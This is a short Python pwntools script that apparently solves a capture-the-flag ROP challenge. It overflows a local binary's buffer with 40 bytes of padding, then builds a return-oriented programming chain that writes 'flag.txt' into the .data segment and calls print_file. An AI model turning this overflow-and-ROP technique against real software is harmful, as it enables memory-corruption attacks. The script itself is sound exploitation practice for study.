from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

#x = cyclic(500)
#p.sendline(x)

padding = b'A' * 40
chain = padding

writeable_mem = p64(0x601028) #address of the .data segment


chain += p64(0x400690) # pop r14; pop r15; ret;
chain += writeable_mem
chain += b'flag.txt'
chain += p64(0x400628) # mov [r14], r15
chain += p64(0x400693) #pop rdi; ret;
chain += writeable_mem
chain += p64(e.sym['print_file'])

p.recvuntil(">")
p.sendline(chain)

response = p.recvall().decode()
print(response)

p.interactive()

